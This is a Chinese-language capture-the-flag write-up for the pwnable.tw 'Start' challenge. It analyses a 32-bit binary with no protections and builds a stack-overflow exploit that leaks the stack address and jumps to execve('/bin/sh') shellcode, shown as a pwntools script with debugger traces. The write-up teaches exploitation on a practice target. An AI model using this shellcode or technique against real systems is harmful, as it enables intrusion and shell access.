
## 概述
來源: pwnable.tw  
題目: Start  
網址: https://pwnable.tw/challenge/  

這是一個很經典的 stack buffer overflow + ROP (Return-Oriented Programming) 攻擊練習

## 分析檔案
```!=
└─$ file start
start: ELF 32-bit LSB executable, Intel i386, version 1 (SYSV), statically linked, not stripped
```
```!=
└─$ checksec --file=start
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH  Symbols         FORTIFY Fortified       Fortifiable     FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   8 Symbols     No    0               0               start                                     
```

```!=                     
└─$ readelf -h ./start
ELF Header:
  Magic:   7f 45 4c 46 01 01 01 00 00 00 00 00 00 00 00 00 
  Class:                             ELF32
  Data:                              2's complement, little endian
  Version:                           1 (current)
  OS/ABI:                            UNIX - System V
  ABI Version:                       0
  Type:                              EXEC (Executable file)
  Machine:                           Intel 80386
  Version:                           0x1
  Entry point address:               0x8048060
  Start of program headers:          52 (bytes into file)
  Start of section headers:          364 (bytes into file)
  Flags:                             0x0
  Size of this header:               52 (bytes)
  Size of program headers:           32 (bytes)
  Number of program headers:         1
  Size of section headers:           40 (bytes)
  Number of section headers:         5
  Section header string table index: 2

```

得知軟體為i386且保護機制：**全部關閉**！ 
```
No RELRO        # 可以改寫 GOT
No canary       # 沒有 stack 保護
NX disabled     # Stack 可執行！
No PIE          # 地址固定
```

## 開啟gdb
因為我環境是macbook搭utm的kali  
怎麼編都編不過  
後來才發現要改成`i386`才能正常反組譯此程式  
透過`claude.ai`了解到可以使用`qemu`  

> 為什麼需要 QEMU？
因為題目是 32-bit x86 (i386) 程式，而現代系統通常是 64-bit。  
QEMU 可以模擬 32-bit 環境執行程式。  

終端機1
```!=
└─$ qemu-i386 -g 1234 ./start
```

終端機2
```!=
└─$ gdb-multiarch -q ./start
GEF for linux ready, type `gef' to start, `gef config' to configure
93 commands loaded and 5 functions added for GDB 16.3 in 0.00ms using Python engine 3.13
./start: No such file or directory.
gef➤  
```
> 後來發現`gdb-multiarch`單純打這樣也可
> 因為主要是靠後面的remote

本身也有`checksec`可以使用
```!=
gef➤  checksec
[+] checksec for '/home/kali/pwnable/start'
Canary                        : ✘ 
NX                            : ✘ 
PIE                           : ✘ 
Fortify                       : ✘ 
RelRO                         : ✘ 
```

## 設定intel i386
```!=
gef➤  show arch
The target architecture is set to "auto" (currently "aarch64").
```
一開始卡在`aarch64`害我怎麼編譯都怪怪的  
後來才發現需要透過`set arch`把`architecture`調整成file的`i386`才可正常編譯  
感謝`claude.ai`  
```!=
gef➤  set arch i386
The target architecture is set to "i386".
gef➤  show arch
The target architecture is set to "i386".
gef➤  
```
連到終端機1的`qume`
```!=
gef➤  target remote:1234
```

終於編譯正常了開心
```!=
[ Legend: Modified register | Code | Heap | Stack | String ]
──────────────────────────────────────────────────────────── registers ────
$eax   : 0x0       
$ebx   : 0x0       
$ecx   : 0x0       
$edx   : 0x0       
$esp   : 0x40800080  →  0x00000001
$ebp   : 0x0       
$esi   : 0x0       
$edi   : 0x0       
$eip   : 0x08048060  →  <_start+0000> push esp
$eflags: [zero carry parity adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x23 $ss: 0x2b $ds: 0x2b $es: 0x2b $fs: 0x00 $gs: 0x2b 
──────────────────────────────────────────────────────────────── stack ────
0x40800080│+0x0000: 0x00000001   ← $esp
0x40800084│+0x0004: 0x4080022a  →  "./start"
0x40800088│+0x0008: 0x00000000
0x4080008c│+0x000c: 0x40800232  →  "COLORFGBG=15;0"
0x40800090│+0x0010: 0x40800241  →  "COLORTERM=truecolor"
0x40800094│+0x0014: 0x40800255  →  "COMMAND_NOT_FOUND_INSTALL_PROMPT=1"
0x40800098│+0x0018: 0x40800278  →  "DBUS_SESSION_BUS_ADDRESS=unix:path=/run/user/1000/[...]"
0x4080009c│+0x001c: 0x408002ae  →  "DESKTOP_SESSION=lightdm-xsession"
────────────────────────────────────────────────────────── code:x86:32 ────
    0x804805a                  add    BYTE PTR [eax], al
    0x804805c                  add    BYTE PTR [eax], al
    0x804805e                  add    BYTE PTR [eax], al
 →  0x8048060 <_start+0000>    push   esp
    0x8048061 <_start+0001>    push   0x804809d
    0x8048066 <_start+0006>    xor    eax, eax
    0x8048068 <_start+0008>    xor    ebx, ebx
    0x804806a <_start+000a>    xor    ecx, ecx
    0x804806c <_start+000c>    xor    edx, edx
────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, stopped 0x8048060 in _start (), reason: SIGTRAP
──────────────────────────────────────────────────────────────── trace ────
[#0] 0x8048060 → _start()
───────────────────────────────────────────────────────────────────────────
[*] Using `target remote` with GEF should work in most cases, but use `gef-remote` if you can. You can disable the overwrite of the `target remote` command by toggling `gef.disable_target_remote_overwrite` in the config.
(remote) gef➤  
```

## 確認function
可以發現有`_start`funcion可確認  
但學了新指令嘗試看看找所有funciton  
```!=
(remote) gef➤  info functions
All defined functions:

Non-debugging symbols:
0x08048060  _start
0x0804809d  _exit
0x080490a3  __bss_start
0x080490a3  _edata
0x080490a4  _end
0x00000554  __kernel_vsyscall
0x00000557  __vdso_clock_gettime
0x0000056b  __vdso_clock_gettime64
0x0000057f  __vdso_clock_getres
0x00000593  __vdso_gettimeofday
0x000005a7  __vdso_time
0x000005b7  __vdso_getcpu
0x000005ce  __kernel_sigreturn
0x000005d7  __kernel_rt_sigreturn
```

## 反組譯
在對`_start`查看反組譯
```!=
(remote) gef➤  disas _start
Dump of assembler code for function _start:
=> 0x08048060 <+0>:     push   esp
   0x08048061 <+1>:     push   0x804809d
   0x08048066 <+6>:     xor    eax,eax
   0x08048068 <+8>:     xor    ebx,ebx
   0x0804806a <+10>:    xor    ecx,ecx
   0x0804806c <+12>:    xor    edx,edx
   0x0804806e <+14>:    push   0x3a465443
   0x08048073 <+19>:    push   0x20656874
   0x08048078 <+24>:    push   0x20747261
   0x0804807d <+29>:    push   0x74732073
   0x08048082 <+34>:    push   0x2774654c
   0x08048087 <+39>:    mov    ecx,esp
   0x08048089 <+41>:    mov    dl,0x14
   0x0804808b <+43>:    mov    bl,0x1
   0x0804808d <+45>:    mov    al,0x4
   0x0804808f <+47>:    int    0x80
   0x08048091 <+49>:    xor    ebx,ebx
   0x08048093 <+51>:    mov    dl,0x3c
   0x08048095 <+53>:    mov    al,0x3
   0x08048097 <+55>:    int    0x80
   0x08048099 <+57>:    add    esp,0x14
   0x0804809c <+60>:    ret
End of assembler dump.

```

以下AI輔助註解
```assembly!=
_start:
   0x8048060: push   esp              # (1) 保存當前 ESP
   0x8048061: push   0x804809d        # (2) 保存 _exit 地址
   
   # 清空暫存器
   0x8048066: xor    eax,eax
   0x8048068: xor    ebx,ebx
   0x804806a: xor    ecx,ecx
   0x804806c: xor    edx,edx
   
   # 準備字串 "Let's start the CTF:"
   0x804806e: push   0x3a465443        # (3) "CTF:"
   0x8048073: push   0x20656874        # (4) " the"
   0x8048078: push   0x20747261        # (5) " art"
   0x804807d: push   0x74732073        # (6) "ts s"
   0x8048082: push   0x2774654c        # (7) "Let'"
   
   # === 第一次 write 系統調用 ===
   0x8048087: mov    ecx,esp           # (8) ECX = ESP (指向字串)
   0x8048089: mov    dl,0x14           # (9) EDX = 20 bytes
   0x804808b: mov    bl,0x1            # (10) EBX = 1 (stdout)
   0x804808d: mov    al,0x4            # (11) EAX = 4 (sys_write)
   0x804808f: int    0x80              # (12) 執行 write(1, esp, 20)
   
   # === read 系統調用 ===
   0x8048091: xor    ebx,ebx           # (13) EBX = 0 (stdin)
   0x8048093: mov    dl,0x3c           # (14) EDX = 60 bytes ⚠️
   0x8048095: mov    al,0x3            # (15) EAX = 3 (sys_read)
   0x8048097: int    0x80              # (16) 執行 read(0, esp, 60)
   
   0x8048099: add    esp,0x14          # (17) ESP += 20
   0x804809c: ret                      # (18) 返回
```

得知write esp+20  
但read 卻能到 esp+60  
且return的地方在 esp+24  
且沒有任何保護機制  

### 攻擊方向

猜測可以透過read覆蓋掉原本return的位址  
讓return跳轉到shellcode   
但這樣要先有shellcode的位址  

因此先嘗試看看能不能跳到write  
讓write出`leak esp`  
在透過此位址算出shellcode位址  

### 製作payload1: 跳到write
因為 return address 在`esp+0x14`  
所以前 20 bytes 隨便塞  
最後 4 bytes 換成 write 的位址  
看能不能 return 到 write 且印出`leak esp`  
> 注意因為剛剛有檢測 `No PIE # 地址固定`才能這樣  


製作 payload1 
```!=
┌──(kali㉿kali)-[~/pwnable/start]
└─$ python3 -c "import sys; sys.stdout.buffer.write(b'A'*20 + b'\x87\x80\x04\x08')" > payload1
                                                                            
┌──(kali㉿kali)-[~/pwnable/start]
└─$ cat payload1        
AAAAAAAAAAAAAAAAAAAA�  
```

### 確認payload1: 是否成功ret到write
終端機1
```!=
(cat payload1; cat) | qemu-i386 -g 1234 start
```
終端機2
```!=
└─$ gdb-multiarch -q        
GEF for linux ready, type `gef' to start, `gef config' to configure
93 commands loaded and 5 functions added for GDB 16.3 in 0.00ms using Python engine 3.13
gef➤  set arch i386
The target architecture is set to "i386".
gef➤  target remote:1234
```
> `-q` 只是覺得顯示基本訊息太長了, 可加可不加
>  -q, --quiet, --silent  
    Do not print version number on startup.

剛進入_start 不小心按到ni
```!=
[ Legend: Modified register | Code | Heap | Stack | String ]
───────────────────────────────────────────────────────────── registers ────
$eax   : 0x0       
$ebx   : 0x0       
$ecx   : 0x0       
$edx   : 0x0       
$esp   : 0x4080005c  →  0x40800060  →  0x00000001
$ebp   : 0x0       
$esi   : 0x0       
$edi   : 0x0       
$eip   : 0x08048061  →  <_start+0001> push 0x804809d
$eflags: [zero carry parity adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x23 $ss: 0x2b $ds: 0x2b $es: 0x2b $fs: 0x00 $gs: 0x2b 
───────────────────────────────────────────────────────────────── stack ────
0x4080005c│+0x0000: 0x40800060  →  0x00000001    ← $esp
0x40800060│+0x0004: 0x00000001
0x40800064│+0x0008: 0x40800216  →  "./start"
0x40800068│+0x000c: 0x00000000
0x4080006c│+0x0010: 0x4080021e  →  "COLORFGBG=15;0"
0x40800070│+0x0014: 0x4080022d  →  "COLORTERM=truecolor"
0x40800074│+0x0018: 0x40800241  →  "COMMAND_NOT_FOUND_INSTALL_PROMPT=1"
0x40800078│+0x001c: 0x40800264  →  "DBUS_SESSION_BUS_ADDRESS=unix:path=/run/user/1000/[...]"
─────────────────────────────────────────────────────────── code:x86:32 ────
    0x804805c                  add    BYTE PTR [eax], al
    0x804805e                  add    BYTE PTR [eax], al
    0x8048060 <_start+0000>    push   esp
 →  0x8048061 <_start+0001>    push   0x804809d
    0x8048066 <_start+0006>    xor    eax, eax
    0x8048068 <_start+0008>    xor    ebx, ebx
    0x804806a <_start+000a>    xor    ecx, ecx
    0x804806c <_start+000c>    xor    edx, edx
    0x804806e <_start+000e>    push   0x3a465443
─────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, stopped 0x8048061 in _start (), reason: SINGLE STEP
───────────────────────────────────────────────────────────────── trace ────
[#0] 0x8048061 → _start()
────────────────────────────────────────────────────────────────────────────
(remote) gef➤  x/5wx $esp
0x4080005c:     0x40800060      0x00000001      0x40800216      0x00000000
0x4080006c:     0x4080021e
```
因為剛執行了`push   esp`  
所以有了這行`0x4080005c│+0x0000: 0x40800060`  
接下來斷點在read前  
```!=
[ Legend: Modified register | Code | Heap | Stack | String ]
───────────────────────────────────────────────────────────── registers ────
$eax   : 0x3       
$ebx   : 0x0       
$ecx   : 0x40800044  →  0x2774654c ("Let'"?)
$edx   : 0x3c      
$esp   : 0x40800044  →  0x2774654c ("Let'"?)
$ebp   : 0x0       
$esi   : 0x0       
$edi   : 0x0       
$eip   : 0x08048097  →  <_start+0037> int 0x80
$eflags: [ZERO carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x23 $ss: 0x2b $ds: 0x2b $es: 0x2b $fs: 0x00 $gs: 0x2b 
───────────────────────────────────────────────────────────────── stack ────
0x40800044│+0x0000: 0x2774654c   ← $ecx, $esp
0x40800048│+0x0004: 0x74732073
0x4080004c│+0x0008: 0x20747261
0x40800050│+0x000c: 0x20656874
0x40800054│+0x0010: 0x3a465443
0x40800058│+0x0014: 0x0804809d  →  <_exit+0000> pop esp
0x4080005c│+0x0018: 0x40800060  →  0x00000001
0x40800060│+0x001c: 0x00000001
─────────────────────────────────────────────────────────── code:x86:32 ────
    0x8048091 <_start+0031>    xor    ebx, ebx
    0x8048093 <_start+0033>    mov    dl, 0x3c
    0x8048095 <_start+0035>    mov    al, 0x3
●→  0x8048097 <_start+0037>    int    0x80
    0x8048099 <_start+0039>    add    esp, 0x14
    0x804809c <_start+003c>    ret    
    0x804809d <_exit+0000>     pop    esp
    0x804809e <_exit+0001>     xor    eax, eax
    0x80480a0 <_exit+0003>     inc    eax
─────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, stopped 0x8048097 in _start (), reason: BREAKPOINT
───────────────────────────────────────────────────────────────── trace ────
[#0] 0x8048097 → _start()
```

可以看到執行完`push   0x804809d`  
所以esp多了`0x40800058│+0x0014: 0x0804809d`  
接下來push字串讓esp來到了`0x40800044`  
詳細如下  
```!=
(remote) gef➤  x/10wx $esp
0x40800044:     0x2774654c      0x74732073      0x20747261      0x20656874
0x40800054:     0x3a465443      0x0804809d      0x40800060      0x00000001
0x40800064:     0x40800216      0x00000000
(remote) gef➤  x/s $esp
0x40800044:     "Let's start the CTF:\235\200\004\b`"
```

ni後，斷點在return前
```!=
[ Legend: Modified register | Code | Heap | Stack | String ]
───────────────────────────────────────────────────────────── registers ────
$eax   : 0x18      
$ebx   : 0x0       
$ecx   : 0x40800044  →  0x41414141 ("AAAA"?)
$edx   : 0x3c      
$esp   : 0x40800058  →  0x08048087  →  <_start+0027> mov ecx, esp
$ebp   : 0x0       
$esi   : 0x0       
$edi   : 0x0       
$eip   : 0x0804809c  →  <_start+003c> ret 
$eflags: [zero carry parity adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x23 $ss: 0x2b $ds: 0x2b $es: 0x2b $fs: 0x00 $gs: 0x2b 
───────────────────────────────────────────────────────────────── stack ────
0x40800058│+0x0000: 0x08048087  →  <_start+0027> mov ecx, esp    ← $esp
0x4080005c│+0x0004: 0x40800060  →  0x00000001
0x40800060│+0x0008: 0x00000001
0x40800064│+0x000c: 0x40800216  →  "./start"
0x40800068│+0x0010: 0x00000000
0x4080006c│+0x0014: 0x4080021e  →  "COLORFGBG=15;0"
0x40800070│+0x0018: 0x4080022d  →  "COLORTERM=truecolor"
0x40800074│+0x001c: 0x40800241  →  "COMMAND_NOT_FOUND_INSTALL_PROMPT=1"
─────────────────────────────────────────────────────────── code:x86:32 ────
    0x8048095 <_start+0035>    mov    al, 0x3
●   0x8048097 <_start+0037>    int    0x80
    0x8048099 <_start+0039>    add    esp, 0x14
 →  0x804809c <_start+003c>    ret    
   ↳   0x8048087 <_start+0027>    mov    ecx, esp
       0x8048089 <_start+0029>    mov    dl, 0x14
       0x804808b <_start+002b>    mov    bl, 0x1
       0x804808d <_start+002d>    mov    al, 0x4
       0x804808f <_start+002f>    int    0x80
       0x8048091 <_start+0031>    xor    ebx, ebx
─────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, stopped 0x804809c in _start (), reason: SINGLE STEP
───────────────────────────────────────────────────────────────── trace ────
[#0] 0x804809c → _start()
```
可以看到esp+0x14(0x40800044+0x14)後  
esp跳到`0x40800058`  
從`0x40800044`到`0x40800054`這`20bytes`已被覆蓋成`A`  
而`0x40800058`也覆蓋成`0x08048087`  
詳細如下  
```!=
(remote) gef➤  x/10wx 0x40800044
0x40800044:     0x41414141      0x41414141      0x41414141      0x41414141
0x40800054:     0x41414141      0x08048087      0x40800060      0x00000001
0x40800064:     0x40800216      0x00000000
(remote) gef➤  x/5s 0x40800044
0x40800044:     'A' <repeats 20 times>, "\207\200\004\b`"
0x4080005e:     "\200@\001"
0x40800062:     ""
0x40800063:     ""
0x40800064:     "\026\002\200@"
```
可對比剛剛read前
```!=
(remote) gef➤  x/10wx $esp
0x40800044:     0x2774654c      0x74732073      0x20747261      0x20656874
0x40800054:     0x3a465443      0x0804809d      0x40800060      0x00000001
0x40800064:     0x40800216      0x00000000
(remote) gef➤  x/s $esp
0x40800044:     "Let's start the CTF:\235\200\004\b`"
```

來ni，跳到`0x08048087`
```!=
[ Legend: Modified register | Code | Heap | Stack | String ]
───────────────────────────────────────────────────────────── registers ────
$eax   : 0x18      
$ebx   : 0x0       
$ecx   : 0x40800044  →  0x41414141 ("AAAA"?)
$edx   : 0x3c      
$esp   : 0x4080005c  →  0x40800060  →  0x00000001
$ebp   : 0x0       
$esi   : 0x0       
$edi   : 0x0       
$eip   : 0x08048087  →  <_start+0027> mov ecx, esp
$eflags: [zero carry parity adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x23 $ss: 0x2b $ds: 0x2b $es: 0x2b $fs: 0x00 $gs: 0x2b 
───────────────────────────────────────────────────────────────── stack ────
0x4080005c│+0x0000: 0x40800060  →  0x00000001    ← $esp
0x40800060│+0x0004: 0x00000001
0x40800064│+0x0008: 0x40800216  →  "./start"
0x40800068│+0x000c: 0x00000000
0x4080006c│+0x0010: 0x4080021e  →  "COLORFGBG=15;0"
0x40800070│+0x0014: 0x4080022d  →  "COLORTERM=truecolor"
0x40800074│+0x0018: 0x40800241  →  "COMMAND_NOT_FOUND_INSTALL_PROMPT=1"
0x40800078│+0x001c: 0x40800264  →  "DBUS_SESSION_BUS_ADDRESS=unix:path=/run/user/1000/[...]"
─────────────────────────────────────────────────────────── code:x86:32 ────
    0x8048078 <_start+0018>    push   0x20747261
    0x804807d <_start+001d>    push   0x74732073
    0x8048082 <_start+0022>    push   0x2774654c
 →  0x8048087 <_start+0027>    mov    ecx, esp
    0x8048089 <_start+0029>    mov    dl, 0x14
    0x804808b <_start+002b>    mov    bl, 0x1
    0x804808d <_start+002d>    mov    al, 0x4
    0x804808f <_start+002f>    int    0x80
    0x8048091 <_start+0031>    xor    ebx, ebx
─────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, stopped 0x8048087 in _start (), reason: SINGLE STEP
───────────────────────────────────────────────────────────────── trace ────
[#0] 0x8048087 → _start()
```
成功跳到`0x8048087`   
確認payload1成功  
且esp因為return +4 所以到`0x4080005c`  
詳細如下  
```!=
(remote) gef➤  x/10wx 0x40800044
0x40800044:     0x41414141      0x41414141      0x41414141      0x41414141
0x40800054:     0x41414141      0x08048087      0x40800060      0x00000001
0x40800064:     0x40800216      0x00000000
(remote) gef➤  x/10wx $esp
0x4080005c:     0x40800060      0x00000001      0x40800216      0x00000000
0x4080006c:     0x4080021e      0x4080022d      0x40800241      0x40800264
0x4080007c:     0x4080029a      0x408002bb
```

### 製作payload2: 跳到shellcode
若繼續執行的話，預期結果如下
```!=
# 可預測這20bytes會write出來
0x4080005c│+0x0000: 0x40800060  →  0x00000001    ← $esp
0x40800060│+0x0004: 0x00000001
0x40800064│+0x0008: 0x40800216  →  "./start"
0x40800068│+0x000c: 0x00000000
0x4080006c│+0x0010: 0x4080021e  →  "COLORFGBG=15;0"
＃ 此為跳轉點
0x40800070│+0x0014: 0x4080022d  →  "COLORTERM=truecolor"
# 此為shellcode
0x40800074│+0x0018: 0x40800241  →  "COMMAND_NOT_FOUND_INSTALL_PROMPT=1"
0x40800078│+0x001c: 0x40800264  →  "DBUS_SESSION_B
```

且注意此時的`0x4080005c`記錄的還是原本的esp  
所以可以預期第二次的write後  
吐出的前`4bytes` `0x40800060`即為`leak esp`  
且`0x40800074`應該是shellcode的注入點  

整合以上透過`0x40800060`為基礎換算payload  
`'A'*20`(作為前20bytes) + `esp+0x14`(0x40800074 shellcode注入位址) + `execve("/bin/sh", NULL, NULL)`(shellcode，需換成位元組)

> AI補充
```
第一次 write 洩漏 leak_esp = 0x40800060

第二次 read 寫入位置：
┌─────────────────┬──────────────────────┐
│ 地址            │ 內容                  │
├─────────────────┼──────────────────────┤
│ 0x4080005c      │ padding (20 bytes)   │
│     ↓           │   'A' * 20           │
│ 0x4080006c      │                      │
├─────────────────┼──────────────────────┤
│ 0x40800070      │ Return Address       │
│                 │ = leak_esp + 0x14    │
│                 │ = 0x40800074         │
├─────────────────┼──────────────────────┤
│ 0x40800074      │ Shellcode 開始       │
│     ↓           │ (23 bytes)           │
└─────────────────┴──────────────────────┘

執行流程：
1. add esp, 0x14  → ESP = 0x40800070
2. ret            → 跳到 [0x40800070] = 0x40800074
3. 執行 shellcode
```

因此得到payload2為
```!=
padding = b'A' * 0x14 
shellcode= b"\x31\xc0\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xb0\x0b\xcd\x80"
ret_addr = (esp+0x14)
payload = padding+ ret_addr + shellcode
```

## POC
因為我不知道怎麼手動注入payload2 QQ  
所以做成python注入  
並且在本地的除錯模式下測試  
```python!=
from pwn import *

# 直接執行本地的start
#r = process(['qemu-i386', './start'])
# 除錯模式
r = process(['qemu-i386', '-g', '1234', './start'])
# 直接跑雲端start
#r = remote('chall.pwnable.tw',10000)

padding = b'A' * 20        # 填充字串區域
ret_addr = p32(0x08048087) # 跳到 mov ecx, esp
payload1 = padding + ret_addr
r.recvuntil(b'CTF:')
r.send(payload1)
# 先透過第一次跳轉取得esp
esp = u32(r.recv(4))
log.success(f"Leaked ESP: 0x{esp:08x}")
shellcode = b"\x31\xc0\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xb0\x0b\xcd\x80"
ret_addr2 =p32(esp+0x14) 
payload2 = padding + ret_addr2 + shellcode

r.send(payload2)
r.interactive()
```

### 確認POC：是否跳到shellcode
斷點到第二次read前
```!=
sume virtualx86 identification]
$cs: 0x23 $ss: 0x2b $ds: 0x2b $es: 0x2b $fs: 0x00 $gs: 0x2b 
───────────────────────────────────────────────────────────────── stack ────
0x4080006c│+0x0000: 0x40800070  →  0x00000001    ← $ecx, $esp
0x40800070│+0x0004: 0x00000001
0x40800074│+0x0008: 0x40800218  →  "./start"
0x40800078│+0x000c: 0x00000000
0x4080007c│+0x0010: 0x40800220  →  "COLORFGBG=15;0"
0x40800080│+0x0014: 0x4080022f  →  "COLORTERM=truecolor"
0x40800084│+0x0018: 0x40800243  →  "COMMAND_NOT_FOUND_INSTALL_PROMPT=1"
0x40800088│+0x001c: 0x40800266  →  "DBUS_SESSION_BUS_ADDRESS=unix:path=/run/user/1000/[...]"
─────────────────────────────────────────────────────────── code:x86:32 ────
    0x8048091 <_start+0031>    xor    ebx, ebx
    0x8048093 <_start+0033>    mov    dl, 0x3c
    0x8048095 <_start+0035>    mov    al, 0x3
●→  0x8048097 <_start+0037>    int    0x80
    0x8048099 <_start+0039>    add    esp, 0x14
    0x804809c <_start+003c>    ret    
    0x804809d <_exit+0000>     pop    esp
    0x804809e <_exit+0001>     xor    eax, eax
    0x80480a0 <_exit+0003>     inc    eax
─────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, stopped 0x8048097 in _start (), reason: BREAKPOINT
───────────────────────────────────────────────────────────────── trace ────
[#0] 0x8048097 → _start()
────────────────────────────────────────────────────────────────────────────
(remote) gef➤  x/10wx $esp
0x4080006c:     0x40800070      0x00000001      0x40800218      0x00000000
0x4080007c:     0x40800220      0x4080022f      0x40800243      0x40800266
0x4080008c:     0x4080029c      0x408002bd
(remote) gef➤  x/10s $esp
0x4080006c:     "p"
0x4080006e:     "\200@\001"
0x40800072:     ""
0x40800073:     ""
0x40800074:     "\030\002\200@"
0x40800079:     ""
0x4080007a:     ""
0x4080007b:     ""
0x4080007c:     " \002\200@/\002\200@C\002\200@f\002\200@\234\002\200@\275\002\200@\312\002\200@\350\002\200@\004\003\200@\024\003\200@%\003\200@/\003\200@<\003\200@M\003\200@l\003\200@\340\003\200@\376\003\200@\031\004\200@6\004\200@I\004\200@g\004\200@\202\004\200@\320\004\200@\343\004\200@\353\004\200@\376\004\200@-\005\200@A\005\200@K\005\200@V\005\200@x\005\200@\231\005\200@\262\005\200@\325\005\200@\356\005\200@6\006\200@f\006\200@|\006\200@\233\006\200@\252\006\200@\336\006\200@\365\006\200@\032\a\200@+\a\200@e\a\200@z\a\200@\205\a\200@\237\a\200@&\017\200@>\017\200@V\017\200@k\017\200@\204\017\200@\231\017\200@\261\017\200@\306\017\200@"
0x4080015d:     ""
```
可以預期  
`0x40800070`為`leak esp`  
`0x40800080`會變成`0x40800084`  
`0x40800084`會變成我們的shellcode  

來ni到return前，見證奇蹟的時刻
```!=
$eip   : 0x0804809c  →  <_start+003c> ret 
$eflags: [zero carry parity ADJUST sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x23 $ss: 0x2b $ds: 0x2b $es: 0x2b $fs: 0x00 $gs: 0x2b 
───────────────────────────────────────────────────────────────── stack ────
0x40800080│+0x0000: 0x40800084  →  0xd231c031    ← $esp
0x40800084│+0x0004: 0xd231c031
0x40800088│+0x0008: 0x2f2f6852
0x4080008c│+0x000c: 0x2f686873
0x40800090│+0x0010: 0x896e6962
0x40800094│+0x0014: 0xb0c931e3
0x40800098│+0x0018: 0x4080cd0b
0x4080009c│+0x001c: 0x40800304  →  "HOME=/home/kali"
─────────────────────────────────────────────────────────── code:x86:32 ────
    0x8048095 <_start+0035>    mov    al, 0x3
●   0x8048097 <_start+0037>    int    0x80
    0x8048099 <_start+0039>    add    esp, 0x14
 →  0x804809c <_start+003c>    ret    
   ↳  0x40800084                  xor    eax, eax
      0x40800086                  xor    edx, edx
      0x40800088                  push   edx
      0x40800089                  push   0x68732f2f
      0x4080008e                  push   0x6e69622f
      0x40800093                  mov    ebx, esp
─────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, stopped 0x804809c in _start (), reason: SINGLE STEP
───────────────────────────────────────────────────────────────── trace ────
[#0] 0x804809c → _start()
(remote) gef➤  x/10wx 0x4080006c
0x4080006c:     0x41414141      0x41414141      0x41414141      0x41414141
0x4080007c:     0x41414141      0x40800084      0xd231c031      0x2f2f6852
0x4080008c:     0x2f686873      0x896e6962
(remote) gef➤  x/10s 0x4080006c
0x4080006c:     'A' <repeats 20 times>, "\204"
0x40800082:     "\200@1\3001\322Rh//shh/bin\211\3431ɰ\v@\004\003\200@\024\003\200@%\003\200@/\003\200@<\003\200@M\003\200@l\003\200@\340\003\200@\376\003\200@\031\004\200@6\004\200@I\004\200@g\004\200@\202\004\200@\320\004\200@\343\004\200@\353\004\200@\376\004\200@-\005\200@A\005\200@K\005\200@V\005\200@x\005\200@\231\005\200@\262\005\200@\325\005\200@\356\005\200@6\006\200@f\006\200@|\006\200@\233\006\200@\252\006\200@\336\006\200@\365\006\200@\032\a\200@+\a\200@e\a\200@z\a\200@\205\a\200@\237\a\200@&\017\200@>\017\200@V\017\200@k\017\200@\204\017\200@\231\017\200@\261\017\200@\306\017\200@"
0x4080015d:     ""
0x4080015e:     ""
0x4080015f:     ""
0x40800160:     " "
0x40800162:     ""
0x40800163:     ""
0x40800164:     "T\025\200@\003"
0x4080016a:     ""
```
一切如我們的預期一樣
再次ni
```!=
[ Legend: Modified register | Code | Heap | Stack | String ]
───────────────────────────────────────────────────────────── registers ────
$eax   : 0x2f      
$ebx   : 0x0       
$ecx   : 0x4080006c  →  0x41414141 ("AAAA"?)
$edx   : 0x3c      
$esp   : 0x40800084  →  0xd231c031
$ebp   : 0x0       
$esi   : 0x0       
$edi   : 0x0       
$eip   : 0x40800084  →  0xd231c031
$eflags: [zero carry parity ADJUST sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x23 $ss: 0x2b $ds: 0x2b $es: 0x2b $fs: 0x00 $gs: 0x2b 
───────────────────────────────────────────────────────────────── stack ────
0x40800084│+0x0000: 0xd231c031   ← $esp, $eip
0x40800088│+0x0004: 0x2f2f6852
0x4080008c│+0x0008: 0x2f686873
0x40800090│+0x000c: 0x896e6962
0x40800094│+0x0010: 0xb0c931e3
0x40800098│+0x0014: 0x4080cd0b
0x4080009c│+0x0018: 0x40800304  →  "HOME=/home/kali"
0x408000a0│+0x001c: 0x40800314  →  "LANG=en_US.UTF-8"
─────────────────────────────────────────────────────────── code:x86:32 ────
 → 0x40800084                  xor    eax, eax
   0x40800086                  xor    edx, edx
   0x40800088                  push   edx
   0x40800089                  push   0x68732f2f
   0x4080008e                  push   0x6e69622f
   0x40800093                  mov    ebx, esp
─────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, stopped 0x40800084 in ?? (), reason: SINGLE STEP
───────────────────────────────────────────────────────────────── trace ────
[#0] 0x40800084 → xor eax, eax

(remote) gef➤  x/10wx $esp
0x40800084:     0xd231c031      0x2f2f6852      0x2f686873      0x896e6962
0x40800094:     0xb0c931e3      0x4080cd0b      0x40800304      0x40800314
0x408000a4:     0x40800325      0x4080032f
(remote) gef➤  x/s $esp
0x40800084:     "1\3001\322Rh//shh/bin\211\3431ɰ\v@\004\003\200@\024\003\200@%\003\200@/\003\200@<\003\200@M\003\200@l\003\200@\340\003\200@\376\003\200@\031\004\200@6\004\200@I\004\200@g\004\200@\202\004\200@\320\004\200@\343\004\200@\353\004\200@\376\004\200@-\005\200@A\005\200@K\005\200@V\005\200@x\005\200@\231\005\200@\262\005\200@\325\005\200@\356\005\200@6\006\200@f\006\200@|\006\200@\233\006\200@\252\006\200@\336\006\200@\365\006\200@\032\a\200@+\a\200@e\a\200@z\a\200@\205\a\200@\237\a\200@&\017\200@>\017\200@V\017\200@k\017\200@\204\017\200@\231\017\200@\261\017\200@\306\017\200@"
(remote) gef➤  

```
成功跳到`0x40800084`  
成功跑到指定的shellcode

## 取得flag
